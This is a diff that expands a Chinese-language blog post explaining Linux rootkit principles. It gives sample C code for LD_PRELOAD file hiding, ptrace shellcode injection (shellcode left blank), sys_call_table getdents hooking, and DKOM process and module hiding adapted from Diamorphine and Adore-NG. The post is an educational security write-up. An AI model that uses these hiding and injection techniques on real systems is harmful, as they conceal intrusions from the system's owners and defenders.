@@ -1,7 +1,7 @@
 ---
 layout:     post
-title:      Linux 安全对抗收集（rootkit篇）TODO
-subtitle:   rootkit 攻击入门
+title:      Linux 安全对抗收集（rootkit篇）
+subtitle:   rootkit 介绍及攻防原理（持续更新）
 date:       2025-05-06
 author:     pandaychen
 header-img:
@@ -12,7 +12,241 @@ tags:
 ---
 
 ##  0x00    前言
+本文对rootkit进行一些原理上的整理
 
+##  0x01    Rootkit基础概念
+Rootkit是一种恶意程序，能够隐藏自身及相关活动（如模块、进程、文件、网络连接等），用以规避安全检测工具。一般分为用户态、内核态rootkit两种：
+
+-   用户态Rootkit：运行在用户空间，通过劫持库函数或注入进程实现隐藏
+-   内核态Rootkit：运行在内核空间，修改内核数据结构或代码，隐蔽性较高，常见基于LKM、eBPF技术实现
+
+一般认为rootkit的特点有：
+
+-   隐藏进程：修改进程链表或系统调用结果，隐藏恶意进程
+-   隐藏文件：篡改文件系统接口，隐藏恶意文件
+-   隐藏网络连接：伪造网络状态，隐藏恶意流量
+-   提权后门：提供持久化高权限访问
+-   数据窃取：窃取敏感信息，传输至C2服务器
+-   自我保护：通过反调试技术阻止分析
+
+##  0x02    用户态rootkit
+用户态Rootkit运行在用户空间，部署简单但隐蔽性较低
+
+####    LD_PRELOAD劫持
+通过设置`LD_PRELOAD`加载自定义动态库，覆盖标准库函数。例如，劫持`readdir`隐藏特定文件或目录：
+
+```CPP
+struct dirent *readdir(DIR *dir) {
+    static struct dirent *(*real_readdir)(DIR *) = NULL;
+    if (!real_readdir) {
+        real_readdir = dlsym(RTLD_NEXT, "readdir");
+    }
+    struct dirent *entry = real_readdir(dir);
+    while (entry && strstr(entry->d_name, "malicious")) {
+        entry = real_readdir(dir); // skip malicious filename
+    }
+    return entry;
+}
+```
+
+原理是通过设置`LD_PRELOAD`环境变量加载恶意共享库，覆盖标准库函数。技术上，`LD_PRELOAD`利用Linux动态链接器的优先加载机制，将恶意函数置于标准库之前
+
+####    进程注入
+通过将恶意代码注入合法进程（如`systemd`）用以隐藏行为。例如使用`ptrace`注入代码：
+
+```CPP
+void inject_code(pid_t pid, unsigned char *code, size_t len) {
+    void *mem = mmap(NULL, len, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+    if (mem == MAP_FAILED) {
+        perror("mmap error");
+        return;
+    }
+    memcpy(mem, code, len);
+
+    if (ptrace(PTRACE_ATTACH, pid, NULL, NULL) == -1) {
+        perror("ptrace error");
+        return;
+    }
+
+    struct user_regs_struct regs;
+    ptrace(PTRACE_GETREGS, pid, NULL, &regs);
+    regs.rip = (unsigned long)mem;
+    ptrace(PTRACE_SETREGS, pid, NULL, &regs);
+    ptrace(PTRACE_DETACH, pid, NULL, NULL);
+}
+
+unsigned char sample_code[] = {
+    // put your shellcode
+    // 如[Linux process injection](https://github.com/W3ndige/linux-process-injection?tab=readme-ov-file)
+    // 通过此shellcode可以实现system("/bin/sh")的功能
+};
+
+int main() {
+    pid_t target_pid = 1234; // 目标进程
+    inject_code(target_pid, sample_code, sizeof(sample_code));
+    return 0;
+}
+```
+
+
+它的原理是利用ptrace将恶意shellcode注入合法进程的内存空间，代码运行于内存，无需磁盘文件，隐蔽性高于LD_PRELOAD。这里展示的代码首先通过mmap分配一块可读、可写、可执行的内存，将shellcode复制进去。然后使用ptrace的PTRACE_ATTACH附加到目标进程，获取其寄存器状态（struct user_regs_struct），修改指令指针rip指向注入的代码，最后分离进程让其执行恶意代码。
+
+用途：隐藏恶意行为，伪装为合法进程。
+挑战：需要root权限，ptrace调用可能被监控
+
+##  0x03    内核态Rootkit
+内核态Rootkit运行在Ring 0，控制系统资源，隐蔽性极高
+
+####    系统调用表劫持
+通过修改`sys_call_table`替换系统调用函数。[`sys_call_table`机制](https://pandaychen.github.io/2025/03/01/A-LINUX-KERNEL-TRAVEL-7/#kallsyms)，如替换`sys_getdents`隐藏文件的代码，一般采用LKM技术实现（LKM是唯一支持运行时动态修改内核系统调用表的实用方案）
+
+```CPP
+asmlinkage long (*orig_getdents)(unsigned int, struct linux_dirent *, unsigned int);
+asmlinkage long hooked_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count) {
+    long ret = orig_getdents(fd, dirp, count);
+    struct linux_dirent *d;
+    int offset = 0;
+    for (offset = 0; offset < ret; ) {
+        d = (struct linux_dirent *)(dirp + offset);
+        if (strstr(d->d_name, "malicious")) {
+            memmove(d, d + d->d_reclen, ret - offset - d->d_reclen);
+            ret -= d->d_reclen;
+        } else {
+            offset += d->d_reclen;
+        }
+    }
+    return ret;
+}
+
+static int __init rootkit_init(void) {
+    orig_getdents = sys_call_table[__NR_getdents];
+    disable_write_protection();
+    // 修改sys_call_table 指针数组
+    sys_call_table[__NR_getdents] = hooked_getdents;
+    enable_write_protection();
+    return 0;
+}
+```
+
+该攻击（系统调用表劫持）的原理是，通过修改`sys_call_table`替换关键系统调用（如`sys_getdents`），用于隐藏文件（ext4-VFS）或者进程（基于`procs`文件系统）。实现上，rootkit需要定位到`sys_call_table`的地址（可通过`kallsyms`或硬编码偏移），然后替换目标函数指针指向恶意hook实现
+
+####    DKOM：直接内核对象操作
+直接内核对象操作（Direct Kernel Object Manipulation），通过直接篡改内核内存中的关键数据结构（如进程、文件对象、网络连接表）实现恶意功能的隐藏，无需依赖传统的hook技术，其核心优势在于极高的隐蔽性，缺点是开发复杂且易引发系统崩溃
+
+由于DKOM 技术核心是直接操作内核对象的内存内容，一般可实现如下功能：
+-   隐藏进程：移除`task_struct`中的进程链表节点（tasks双向链表），使`ps`、`/proc`等无法枚举恶意进程
+-   隐藏文件：篡改文件系统对象（如`dentry`），从目录项链表中删除恶意文件节点，导致`ls`或文件系统扫描跳过该文件
+-   提权：修改进程凭证（如`cred`结构体），将普通进程的`UID`/`GID`替换为`0`（即拿到了`root`权限）
+-   无钩子痕迹：不同于系统调用表劫持或函数钩子，DKOM技术不修改代码指针，仅篡改数据，规避了基于代码完整性扫描的检测
+
+介绍两个典型 DKOM Rootkit 案例
+
+1、[Diamorphine](https://github.com/m0nad/Diamorphine/blob/master/diamorphine.c)
+
+-   进程隐藏：从`init_task`链表中移除目标进程的`task_struct`节点
+-   模块隐藏：将自身LKM从内核模块链表（`modules`）中移除，规避`lsmod`检测
+
+```cpp
+void
+// 模块隐藏，在初始化时移除链表节点
+// 在模块加载函数 diamorphine_init() 中，调用 list_del() 将自身从链表中摘除
+module_hide(void)
+{
+	module_previous = THIS_MODULE->list.prev;
+	list_del(&THIS_MODULE->list);    // 删除当前模块的链表节点
+	module_hidden = 1;
+}
+
+// 进程隐藏
+struct task_struct *
+find_task(pid_t pid)
+{
+	struct task_struct *p = current;
+	for_each_process(p) {
+		if (p->pid == pid)
+			return p;
+	}
+	return NULL;
+}
+
+int
+is_invisible(pid_t pid)
+{
+	struct task_struct *task;
+	if (!pid)
+		return 0;
+	task = find_task(pid);
+	if (!task)
+		return 0;
+	if (task->flags & PF_INVISIBLE)
+		return 1;
+	return 0;
+}
+```
+
+2、[Adore-NG](https://github.com/yaoyumeng/adore-ng/)
+
+-   [进程隐藏](https://github.com/yaoyumeng/adore-ng/blob/master/adore-ng.c#L193)：与`Diamorphine`实现类似
+-   [文件隐藏]()：值得一提的是，adore-ng是通过修改VFS架构中的`file_operations`的实现来完成的，主要是`f_op->readdir`、`f_op->iterate`这两个方法，代码如下
+
+```CPP
+int patch_vfs(const char *p, 
+#if (LINUX_VERSION_CODE < KERNEL_VERSION(3, 11, 0))
+			readdir_t *orig_readdir, readdir_t new_readdir
+#else
+			iterate_dir_t *orig_iterate, iterate_dir_t new_iterate
+#endif
+			)
+{
+	struct file_operations *new_op;
+	struct file *filep;
+
+	filep = filp_open(p, O_RDONLY|O_DIRECTORY, 0);
+	if (IS_ERR(filep)) {
+        return -1;
+	}
+	
+#if (LINUX_VERSION_CODE < KERNEL_VERSION(3, 11, 0))
+	if (orig_readdir)
+		*orig_readdir = filep->f_op->readdir;
+#else
+	if (orig_iterate)
+		*orig_iterate = filep->f_op->iterate;
+#endif
+
+	new_op = (struct file_operations *)filep->f_op;
+#if (LINUX_VERSION_CODE < KERNEL_VERSION(3, 11, 0))	
+	new_op->readdir = new_readdir;
+#else
+	new_op->iterate = new_iterate;
+	printk("patch starting, %p --> %p\n", *orig_iterate, new_iterate);
+#endif
+
+	filep->f_op = new_op;
+	filp_close(filep, 0);
+	return 0;
+}
+```
+
+####    内核模块加载
+大部分内核rootkit都是以可加载内核模块（LKM）形式运行，注册恶意逻辑，如下面的代码，其工作原理是通过LKM加载rootkit，隐藏自身模块，调用`hide_process`隐藏进程
+
+```CPP
+static int __init rootkit_init(void) {
+    printk(KERN_INFO "Rootkit mount\n");
+    hide_process(1234); // 隐藏PID 1234
+    list_del(&THIS_MODULE->list); // 隐藏模块
+    return 0;
+}
+
+static void __exit rootkit_exit(void) {
+    printk(KERN_INFO "Rootkit unmount\n");
+}
+
+module_init(rootkit_init);
+module_exit(rootkit_exit);
+MODULE_LICENSE("GPL");
+```
 
 ##  0x0B  参考
 -   [Linux中基于eBPF的恶意利用与检测机制](https://www.cnxct.com/evil-use-ebpf-and-how-to-detect-ebpf-rootkit-in-linux/)
@@ -21,3 +255,6 @@ tags:
 -   [检测Linux Rootkit入侵威胁](https://help.aliyun.com/zh/security-center/user-guide/detect-linux-rootkit-intrusions)
 -   [Diamorphine](https://github.com/m0nad/Diamorphine/blob/master/diamorphine.c)
 -   [隐匿与追踪：Rootkit检测与绕过技术分析](https://tiangonglab.github.io/blog/tiangongarticle73/)
+-   [Linux rootkit 深度分析：可加载内核模块](https://zhuanlan.zhihu.com/p/666203507)
+-   [Linux process injection](https://github.com/W3ndige/linux-process-injection?tab=readme-ov-file)
+-   [Linux Rootkit Sample && Rootkit Defenser Analysis](https://www.cnblogs.com/LittleHann/p/3879961.html)
